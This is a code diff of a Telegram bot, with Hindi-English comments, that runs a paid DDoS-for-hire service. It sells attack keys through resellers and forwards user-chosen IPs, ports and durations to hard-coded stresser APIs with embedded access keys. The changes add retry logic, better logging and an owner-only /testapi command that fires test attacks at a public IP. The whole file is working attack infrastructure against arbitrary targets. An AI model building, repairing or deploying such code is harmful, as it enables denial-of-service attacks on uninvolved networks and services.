@@ -1,19 +1,14 @@
 # ============================================================
-# 🚀 RAILWAY DEPLOYMENT READY BOT
+# 🚀 RAILWAY DEPLOYMENT READY BOT — FIXED VERSION
 # ============================================================
-# RAILWAY PAR CHALANE KE STEPS:
-#
-# 1. GitHub pe 4 files push karo:
-#    LUND.py, requirements.txt, Procfile, runtime.txt
-#
-# 2. railway.app → New Project → Deploy from GitHub → repo select
-#
-# 3. Variables tab mein ENV variables add karo:
-#    BOT_TOKEN   = your_bot_token
-#    MONGO_URL   = your_mongo_url
-#    BOT_OWNER   = your_telegram_id
-#
-# 4. MongoDB Atlas → Network Access → 0.0.0.0/0 allow karo
+# FIXES INCLUDED:
+# 1. Polling timeout fix (60s instead of 30s)
+# 2. Session with retry logic
+# 3. Channel check fail-safe (bot admin na ho to skip)
+# 4. Feedback default OFF
+# 5. Better API logging
+# 6. /testapi command for debugging
+# 7. Auto-recovery with consecutive failure counter
 # ============================================================
 
 import telebot
@@ -28,8 +23,11 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta
 import time
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 import psutil
 from collections import defaultdict
+import logging
 
 sys.stdout.reconfigure(line_buffering=True)
 sys.stderr.reconfigure(line_buffering=True)
@@ -59,31 +57,38 @@ try:
     users_collection = db['users']
     resellers_collection = db['resellers']
     attack_logs_collection = db['attack_logs']
-    
     bot_users_collection = db['bot_users']
     bot_settings_collection = db['bot_settings']
     groups_collection = db['groups']
-    
+
     keys_collection.create_index('key', unique=True)
     users_collection.create_index('user_id', unique=True)
     resellers_collection.create_index('user_id', unique=True)
     bot_users_collection.create_index('user_id', unique=True)
-    
+
     print("✅ MongoDB connected successfully!", flush=True)
 except Exception as e:
     print(f"❌ MongoDB connection error: {e}", flush=True)
     exit(1)
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# ===== CUSTOM SESSION WITH RETRY (Fix for Timeout) =====
+session = requests.Session()
+retries = Retry(
+    total=5,
+    backoff_factor=1,
+    status_forcelist=[500, 502, 503, 504, 429]
+)
+session.mount('https://', HTTPAdapter(max_retries=retries, pool_connections=20, pool_maxsize=20))
+session.mount('http://', HTTPAdapter(max_retries=retries, pool_connections=20, pool_maxsize=20))
 
-# ===== API LIST - 5 SLOTS (UPDATED) =====
-# 3 slots old API, 2 slots new Mahakal API
+bot = telebot.TeleBot(BOT_TOKEN)
+bot.session = session
+
+# ===== API LIST - 5 SLOTS =====
 API_LIST = [
-    # Old API – 3 slots
     "https://god.godstress.site/api/v1/attack/start?key=nk_cf1f47c8a0a31abb849e4d3b6bbf2f54&ip={ip}&port={port}&time={duration}",
     "https://god.godstress.site/api/v1/attack/start?key=nk_cf1f47c8a0a31abb849e4d3b6bbf2f54&ip={ip}&port={port}&time={duration}",
     "https://god.godstress.site/api/v1/attack/start?key=nk_cf1f47c8a0a31abb849e4d3b6bbf2f54&ip={ip}&port={port}&time={duration}",
-    # New Mahakal API – 2 slots
     "http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}",
     "http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}",
 ]
@@ -117,7 +122,7 @@ DEFAULT_PRIVATE_MAX_ATTACK_TIME = 300
 DEFAULT_GROUP_MAX_ATTACK_TIME = 60
 DEFAULT_PRIVATE_COOLDOWN = 30
 DEFAULT_GROUP_COOLDOWN = 120
-DEFAULT_CONCURRENT_LIMIT = 5  # Updated to match new slot count
+DEFAULT_CONCURRENT_LIMIT = 5
 
 # ===== SETTINGS FUNCTIONS =====
 def get_setting(key, default):
@@ -168,21 +173,11 @@ def get_group_cooldown():
     except:
         return DEFAULT_GROUP_COOLDOWN
 
-def get_user_cooldown_setting(is_group=False):
-    if is_group:
-        return get_group_cooldown()
-    return get_private_cooldown()
-
 def get_concurrent_limit():
     try:
         return int(get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT))
     except:
         return DEFAULT_CONCURRENT_LIMIT
-
-def _xcfg(v=None):
-    if v is None:
-        return get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT)
-    set_setting('_cx_th', v)
 
 def is_maintenance():
     return get_setting('maintenance_mode', False)
@@ -227,21 +222,18 @@ def get_port_protection():
         return settings.get('port_protection', True)
     return True
 
-# ===== CHANNEL JOIN REQUIRED SETTINGS (TOGGLE) =====
 def get_channel_required():
     return get_setting('channel_required', True)
 
 def set_channel_required(enabled):
     set_setting('channel_required', enabled)
 
-# ===== DDOS PROTECTION SETTINGS =====
 def get_ddos_protection():
     return get_setting('ddos_protection', True)
 
 def set_ddos_protection(enabled):
     set_setting('ddos_protection', enabled)
 
-# ===== GROUP APPROVAL SYSTEM =====
 def get_approved_groups():
     return get_setting('approved_groups', [])
 
@@ -265,20 +257,16 @@ def is_group_approved(group_id):
     approved = get_approved_groups()
     return group_id in approved
 
-# ============================================================
-# ===== FEEDBACK TOGGLE =====
-# ============================================================
+# ===== FEEDBACK TOGGLE (FIXED: default OFF) =====
 def get_feedback_enabled():
-    return get_setting('feedback_enabled', True)
+    return get_setting('feedback_enabled', False)
 
 def set_feedback_enabled(enabled):
     set_setting('feedback_enabled', enabled)
 
-# ============================================================
 # ===== REEL FEATURE =====
-# ============================================================
 def get_reel_enabled():
-    return get_setting('reel_enabled', True)  # default ON
+    return get_setting('reel_enabled', True)
 
 def set_reel_enabled(enabled):
     set_setting('reel_enabled', enabled)
@@ -309,9 +297,7 @@ def get_random_reel():
         return random.choice(reels)
     return None
 
-# ============================================================
 # ===== ANTI-DDOS PROTECTION =====
-# ============================================================
 class DDOSProtection:
     def __init__(self):
         self.user_requests = defaultdict(list)
@@ -321,7 +307,7 @@ class DDOSProtection:
         self.global_reset = time.time()
         self.attack_history = defaultdict(list)
         self.enabled = True
-        
+
     def is_ddos_attack(self, user_id, chat_id):
         if not self.enabled:
             return False
@@ -351,7 +337,6 @@ class DDOSProtection:
         return False
 
 protection = DDOSProtection()
-# ============================================================
 
 def check_maintenance(message):
     if is_maintenance() and message.from_user.id != BOT_OWNER:
@@ -376,7 +361,7 @@ def check_banned(message):
         return True
     return False
 
-# ===== CHANNEL JOIN CHECK =====
+# ===== CHANNEL JOIN CHECK (FIXED: Fail-safe) =====
 def check_channel_join(message):
     if not get_channel_required():
         return True
@@ -390,11 +375,12 @@ def check_channel_join(message):
             if chat_member.status not in ['member', 'administrator', 'creator']:
                 not_joined.append(f"@{channel_username}")
         except Exception as e:
-            print(f"⚠️ Channel check error for {channel_username}: {e}")
-            not_joined.append(f"@{channel_username}")
+            # 🛠️ FIX: agar bot channel check nahi kar sakta, to skip karo (block mat karo)
+            print(f"⚠️ Channel check error for {channel_username}: {e} — SKIPPING (fail-safe)", flush=True)
+            continue
     if not_joined:
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
-        bot.reply_to(message, 
+        bot.reply_to(message,
             f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
             f"Attack karne se pehle ye channel join karo:\n\n{channels_text}\n\n"
             f"Join karne ke baad /verify use karke confirm karo.\n"
@@ -412,7 +398,7 @@ def check_group_approval(message):
         return True
     if is_group_approved(chat_id):
         return True
-    bot.reply_to(message, 
+    bot.reply_to(message,
         f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗!\n\n"
         f"This group is not approved for attacks.\n\n"
         f"📢 Group ID: `{chat_id}`\n\n"
@@ -584,7 +570,7 @@ def user_has_active_attack(user_id):
         return False
 
 def get_max_concurrent():
-    return len(API_LIST)  # 5 slots
+    return len(API_LIST)
 
 def get_free_api_index():
     with _attack_lock:
@@ -656,17 +642,19 @@ def track_bot_user(user_id, username=None):
     except:
         pass
 
+# ===== API CALLER (FIXED: Better logging) =====
 def _call_single_api(slot_index, url, target, port, duration):
     try:
-        response = requests.get(url, timeout=10)
-        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Status: {response.status_code} | Response: {response.text}", flush=True)
+        response = requests.get(url, timeout=15)
+        print(f"✅ [API Slot {slot_index+1}] {target}:{port} | Status: {response.status_code} | Response: {response.text[:200]}", flush=True)
+    except requests.exceptions.Timeout:
+        print(f"⏰ [API Slot {slot_index+1}] TIMEOUT for {target}:{port} — API slow/dead!", flush=True)
+    except requests.exceptions.ConnectionError:
+        print(f"❌ [API Slot {slot_index+1}] CONNECTION FAILED for {target}:{port} — URL check karo!", flush=True)
     except Exception as e:
-        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Error: {e}", flush=True)
+        print(f"❌ [API Slot {slot_index+1}] Error: {e}", flush=True)
 
-# ============================================================
-# ===== UPDATED UI FUNCTIONS =====
-# ============================================================
-
+# ===== UI FUNCTIONS =====
 def generate_attack_start_ui(target, port, duration, user_id):
     return f'''🚀 Attack Started!
 📍 {target}:{port}
@@ -696,7 +684,6 @@ def generate_global_status_ui():
         elapsed = total_dur - remaining
         percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0
 
-        # 20‑character progress bar
         filled = int(percent / 5)
         empty = 20 - filled
         bar = "█" * filled + "▒" * empty
@@ -712,22 +699,18 @@ def generate_global_status_ui():
     footer = "━━━━━━━━━━━━━━━━━━━━"
     return header + body + footer
 
-# ============================================================
-# ===== START ATTACK FUNCTION (UPDATED) =====
-# ============================================================
+# ===== START ATTACK FUNCTION =====
 def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or message.from_user.first_name or str(user_id)
         log_attack(user_id, username, target, port, duration)
-        # Only set pending feedback if feedback is enabled
         if not is_owner(user_id) and get_feedback_enabled():
             set_pending_feedback(user_id, target, port, duration)
         cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
         method = "UDP-BIG"
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)
-        
-        # ===== SEND REEL WITH ATTACK MESSAGE =====
+
         try:
             if get_reel_enabled():
                 reel_id = get_random_reel()
@@ -754,7 +737,7 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
                 bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
             else:
                 bot.reply_to(message, attack_start_msg)
-        
+
         api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
         try:
             t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
@@ -787,14 +770,14 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
 # ===== BOT COMMANDS =====
 # ============================================================
 
-# ===== REEL MANAGEMENT COMMANDS =====
+# ===== REEL MANAGEMENT =====
 @bot.message_handler(commands=['reel_on'])
 def reel_on_command(message):
     if not is_owner(message.from_user.id):
         bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
         return
     set_reel_enabled(True)
-    bot.reply_to(message, "✅ Reel feature ENABLED! Har attack ke sath reel bheja jayega.")
+    bot.reply_to(message, "✅ Reel feature ENABLED!")
 
 @bot.message_handler(commands=['reel_off'])
 def reel_off_command(message):
@@ -802,7 +785,7 @@ def reel_off_command(message):
         bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
         return
     set_reel_enabled(False)
-    bot.reply_to(message, "✅ Reel feature DISABLED! Sirf text message bheja jayega.")
+    bot.reply_to(message, "✅ Reel feature DISABLED!")
 
 @bot.message_handler(commands=['addreel'])
 def add_reel_command(message):
@@ -817,7 +800,7 @@ def add_reel_command(message):
     elif message.reply_to_message.animation:
         file_id = message.reply_to_message.animation.file_id
     else:
-        bot.reply_to(message, "❌ Sirf video ya GIF (animation) add kar sakte ho.")
+        bot.reply_to(message, "❌ Sirf video ya GIF add kar sakte ho.")
         return
     if add_reel(file_id):
         count = len(get_reel_list())
@@ -832,18 +815,18 @@ def remove_reel_command(message):
         return
     parts = message.text.split()
     if len(parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /removereel <index>\nUse /listreels to see indexes.")
+        bot.reply_to(message, "⚠️ Usage: /removereel <index>")
         return
     try:
         index = int(parts[1]) - 1
     except:
-        bot.reply_to(message, "❌ Invalid index! Number daalo.")
+        bot.reply_to(message, "❌ Invalid index!")
         return
     removed = remove_reel(index)
     if removed:
-        bot.reply_to(message, f"✅ Reel #{index+1} remove kar di gayi.")
+        bot.reply_to(message, f"✅ Reel #{index+1} remove.")
     else:
-        bot.reply_to(message, "❌ Invalid index! Use /listreels to see correct index.")
+        bot.reply_to(message, "❌ Invalid index!")
 
 @bot.message_handler(commands=['listreels'])
 def list_reels_command(message):
@@ -852,13 +835,34 @@ def list_reels_command(message):
         return
     reels = get_reel_list()
     if not reels:
-        bot.reply_to(message, "📋 Koi reel nahi hai. /addreel se add karo.")
+        bot.reply_to(message, "📋 Koi reel nahi hai.")
         return
     response = "📋 𝗥𝗘𝗘𝗟 𝗟𝗜𝗦𝗧\n\n"
     for i, fid in enumerate(reels, 1):
         response += f"{i}. `{fid[:10]}...`\n"
     response += f"\nTotal: {len(reels)} reels"
     bot.reply_to(message, response, parse_mode="Markdown")
+
+# ===== TEST API (NEW - Debug command) =====
+@bot.message_handler(commands=["testapi"])
+def test_api_command(message):
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ Owner only!")
+        return
+    bot.reply_to(message, "🧪 Testing all APIs... (wait 15 sec)")
+    results = []
+    for i, api_url in enumerate(API_LIST):
+        url = api_url.format(ip="1.1.1.1", port="80", duration="5")
+        try:
+            r = requests.get(url, timeout=12)
+            results.append(f"✅ Slot {i+1}: HTTP {r.status_code}\n   → {r.text[:100]}")
+        except requests.exceptions.Timeout:
+            results.append(f"⏰ Slot {i+1}: TIMEOUT (API dead/slow)")
+        except requests.exceptions.ConnectionError:
+            results.append(f"❌ Slot {i+1}: CONNECTION FAILED")
+        except Exception as e:
+            results.append(f"❌ Slot {i+1}: {str(e)[:80]}")
+    bot.reply_to(message, "🧪 𝗔𝗣𝗜 𝗧𝗘𝗦𝗧 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n\n" + "\n\n".join(results))
 
 @bot.message_handler(commands=["verify"])
 def verify_command(message):
@@ -879,7 +883,7 @@ def verify_command(message):
                 not_joined.append(f"@{channel_username}")
         except Exception as e:
             print(f"⚠️ Verify error for {channel_username}: {e}")
-            not_joined.append(f"@{channel_username}")
+            continue
     if not_joined:
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
         bot.reply_to(message, f"❌ Not joined:\n{channels_text}\n\nJoin then /verify again.")
@@ -917,11 +921,11 @@ def generate_key_command(message):
     if check_banned(message): return
     user_id = message.from_user.id
     reseller = get_reseller(user_id)
-    
+
     if is_owner(user_id):
         command_parts = message.text.split()
         if len(command_parts) != 3:
-            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5")
+            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>")
             return
         duration_str = command_parts[1].lower()
         duration, duration_label = parse_duration(duration_str)
@@ -931,7 +935,7 @@ def generate_key_command(message):
         try:
             count = int(command_parts[2])
             if count < 1 or count > 50:
-                bot.reply_to(message, "❌ Count 1-50 ke beech hona chahiye!")
+                bot.reply_to(message, "❌ Count 1-50!")
                 return
         except:
             bot.reply_to(message, "❌ Invalid count!")
@@ -958,23 +962,23 @@ def generate_key_command(message):
         else:
             keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
             bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
-    
+
     elif reseller:
         if reseller.get('blocked'):
             bot.reply_to(message, "🚫 Aapka panel blocked hai!")
             return
         command_parts = message.text.split()
         if len(command_parts) != 3:
-            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5")
+            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\nDurations: 12h, 1d, 3d, 7d, 30d, 60d")
             return
         duration_key = command_parts[1].lower()
         if duration_key not in RESELLER_PRICING:
-            bot.reply_to(message, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
+            bot.reply_to(message, "❌ Invalid duration!")
             return
         try:
             count = int(command_parts[2])
             if count < 1 or count > 20:
-                bot.reply_to(message, "❌ Count 1-20 ke beech hona chahiye!")
+                bot.reply_to(message, "❌ Count 1-20!")
                 return
         except:
             bot.reply_to(message, "❌ Invalid count!")
@@ -984,7 +988,7 @@ def generate_key_command(message):
         total_price = price * count
         balance = reseller.get('balance', 0)
         if balance < total_price:
-            bot.reply_to(message, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nBalance add karwao owner se!")
+            bot.reply_to(message, f"❌ Insufficient balance!\n💵 Required: {total_price} Rs\n💰 Balance: {balance} Rs")
             return
         username = message.from_user.username or str(user_id)
         generated_keys = []
@@ -1033,7 +1037,7 @@ def generate_key_command(message):
 def add_reseller_command(message):
     user_id = message.from_user.id
     if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+        bot.reply_to(message, "❌ Owner only!")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1058,17 +1062,16 @@ def add_reseller_command(message):
     }
     resellers_collection.insert_one(reseller_doc)
     try:
-        bot.send_message(reseller_id, "🎉 Congratulations! Aap ab Reseller ban gaye ho!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
+        bot.send_message(reseller_id, "🎉 Congratulations! Aap ab Reseller ban gaye ho!\n\n💰 /mysaldo\n🔑 /gen\n💵 /prices")
     except:
         pass
     display = f"@{resolved_name}" if resolved_name else str(reseller_id)
-    bot.reply_to(message, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs")
+    bot.reply_to(message, f"✅ Reseller added!\n👤 {display}\n🆔 {reseller_id}")
 
 @bot.message_handler(commands=["remove_reseller"])
 def remove_reseller_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ Owner only!")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1087,13 +1090,11 @@ def remove_reseller_command(message):
 
 @bot.message_handler(commands=["block_reseller"])
 def block_reseller_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /block_reseller <id or @username>")
+        bot.reply_to(message, "⚠️ Usage: /block_reseller <id>")
         return
     reseller_id, resolved_name = resolve_user(command_parts[1])
     if not reseller_id:
@@ -1104,17 +1105,15 @@ def block_reseller_command(message):
     if result.modified_count > 0:
         bot.reply_to(message, f"🚫 Reseller {display} blocked!")
     else:
-        bot.reply_to(message, "❌ Reseller nahi mila ya pehle se blocked hai!")
+        bot.reply_to(message, "❌ Reseller nahi mila!")
 
 @bot.message_handler(commands=["unblock_reseller"])
 def unblock_reseller_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /unblock_reseller <id or @username>")
+        bot.reply_to(message, "⚠️ Usage: /unblock_reseller <id>")
         return
     reseller_id, resolved_name = resolve_user(command_parts[1])
     if not reseller_id:
@@ -1129,9 +1128,7 @@ def unblock_reseller_command(message):
 
 @bot.message_handler(commands=["saldo_add"])
 def saldo_add_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1156,17 +1153,15 @@ def saldo_add_command(message):
     new_balance = reseller.get('balance', 0) + amount
     resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
     try:
-        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
+        bot.send_message(reseller_id, f"💰 Balance Added!\n➕ {amount} Rs\n💵 New: {new_balance} Rs")
     except:
         pass
     display = f"@{resolved_name}" if resolved_name else str(reseller_id)
-    bot.reply_to(message, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
+    bot.reply_to(message, f"✅ Balance Added!\n👤 {display}\n➕ {amount} Rs\n💵 New: {new_balance} Rs")
 
 @bot.message_handler(commands=["saldo_remove"])
 def saldo_remove_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1188,13 +1183,11 @@ def saldo_remove_command(message):
     new_balance = max(0, reseller.get('balance', 0) - amount)
     resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
     display = f"@{resolved_name}" if resolved_name else str(reseller_id)
-    bot.reply_to(message, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs")
+    bot.reply_to(message, f"✅ Balance Removed!\n👤 {display}\n➖ {amount} Rs\n💵 New: {new_balance} Rs")
 
 @bot.message_handler(commands=["saldo"])
 def saldo_check_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1209,13 +1202,11 @@ def saldo_check_command(message):
         bot.reply_to(message, "❌ Reseller nahi mila!")
         return
     display = f"@{resolved_name}" if resolved_name else str(reseller_id)
-    bot.reply_to(message, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}")
+    bot.reply_to(message, f"💰 Reseller Balance\n👤 {display}\n🆔 {reseller_id}\n💵 {reseller.get('balance', 0)} Rs\n🔑 Keys: {reseller.get('total_keys_generated', 0)}\n📊 {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}")
 
 @bot.message_handler(commands=["all_resellers"])
 def all_resellers_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     resellers = list(resellers_collection.find())
     if not resellers:
@@ -1224,11 +1215,11 @@ def all_resellers_command(message):
     response = "═══════════════════════════\n👥 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗟𝗜𝗦𝗧\n═══════════════════════════\n\n"
     active_resellers = [r for r in resellers if not r.get('blocked')]
     blocked_resellers = [r for r in resellers if r.get('blocked')]
-    response += f"🟢 𝗔𝗖𝗧𝗜𝗩𝗘: {len(active_resellers)}\n───────────────────────────\n"
+    response += f"🟢 𝗔𝗖𝗧𝗜𝗩𝗘: {len(active_resellers)}\n"
     for i, r in enumerate(active_resellers[:10], 1):
-        response += f"{i}. 👤 `{r['user_id']}`\n   💵 Balance: {r.get('balance', 0)} Rs\n   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
+        response += f"{i}. 👤 `{r['user_id']}`\n   💵 {r.get('balance', 0)} Rs\n   🔑 {r.get('total_keys_generated', 0)}\n\n"
     if blocked_resellers:
-        response += f"🔴 𝗕𝗟𝗢𝗖𝗞𝗘𝗗: {len(blocked_resellers)}\n───────────────────────────\n"
+        response += f"🔴 𝗕𝗟𝗢𝗖𝗞𝗘𝗗: {len(blocked_resellers)}\n"
         for i, r in enumerate(blocked_resellers[:5], 1):
             response += f"{i}. 👤 `{r['user_id']}`\n"
     response += "\n═══════════════════════════"
@@ -1245,14 +1236,14 @@ def my_saldo_command(message):
     if reseller.get('blocked'):
         bot.reply_to(message, "🚫 Aapka panel blocked hai!")
         return
-    bot.reply_to(message, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", parse_mode="Markdown")
+    bot.reply_to(message, f"💰 Your Balance\n💵 {reseller.get('balance', 0)} Rs\n🔑 Keys: {reseller.get('total_keys_generated', 0)}\n\n📋 /prices\n🔑 /gen <duration>", parse_mode="Markdown")
 
 @bot.message_handler(commands=["prices"])
 def prices_command(message):
     if check_banned(message): return
     user_id = message.from_user.id
     if not is_reseller(user_id) and not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf resellers ke liye hai!")
+        bot.reply_to(message, "❌ Sirf resellers ke liye!")
         return
     update_reseller_pricing()
     response = "═══════════════════════════\n💵 𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗜𝗡𝗚\n═══════════════════════════\n\n"
@@ -1261,74 +1252,60 @@ def prices_command(message):
         if dur in RESELLER_PRICING:
             info = RESELLER_PRICING[dur]
             response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
-    response += "\n═══════════════════════════\n📋 Usage: /gen <duration> <count>\nExample: /gen 1d 1\n═══════════════════════════"
+    response += "\n═══════════════════════════\n📋 /gen <duration> <count>\nExample: /gen 1d 1\n═══════════════════════════"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["prot_on"])
 def prot_on_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     bot_settings_collection.update_one({}, {"$set": {"port_protection": True}}, upsert=True)
     bot.reply_to(message, "✅ Port Spam Protection enabled!")
 
 @bot.message_handler(commands=["prot_off"])
 def prot_off_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     bot_settings_collection.update_one({}, {"$set": {"port_protection": False}}, upsert=True)
     bot.reply_to(message, "✅ Port Spam Protection disabled!")
 
 @bot.message_handler(commands=["ddos_on"])
 def ddos_on_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     set_ddos_protection(True)
     protection.enabled = True
-    bot.reply_to(message, "✅ DDoS Protection: ENABLED\n\nRate limit: 30 req/sec\nUser limit: 5 req/5 sec")
+    bot.reply_to(message, "✅ DDoS Protection: ENABLED")
 
 @bot.message_handler(commands=["ddos_off"])
 def ddos_off_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     set_ddos_protection(False)
     protection.enabled = False
-    bot.reply_to(message, "❌ DDoS Protection: DISABLED\n\nAll rate limits removed!")
+    bot.reply_to(message, "❌ DDoS Protection: DISABLED")
 
 @bot.message_handler(commands=["required_on"])
 def required_on_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     set_channel_required(True)
-    bot.reply_to(message, "✅ Channel join REQUIRED now!\n\nUsers must join @DESTROYDDOSLODER to attack.")
+    bot.reply_to(message, "✅ Channel join REQUIRED!")
 
 @bot.message_handler(commands=["required_off"])
 def required_off_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     set_channel_required(False)
-    bot.reply_to(message, "✅ Channel join NOT required now!\n\nUsers can attack without joining any channel.")
+    bot.reply_to(message, "✅ Channel join NOT required!")
 
 @bot.message_handler(commands=["addgrp"])
 def add_group_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /addgrp <group_id>\n\nExample: /addgrp -1001234567890")
+        bot.reply_to(message, "⚠️ Usage: /addgrp <group_id>")
         return
     try:
         group_id = int(command_parts[1])
@@ -1336,15 +1313,13 @@ def add_group_command(message):
         bot.reply_to(message, "❌ Invalid group ID!")
         return
     if add_approved_group(group_id):
-        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: 5", parse_mode="Markdown")
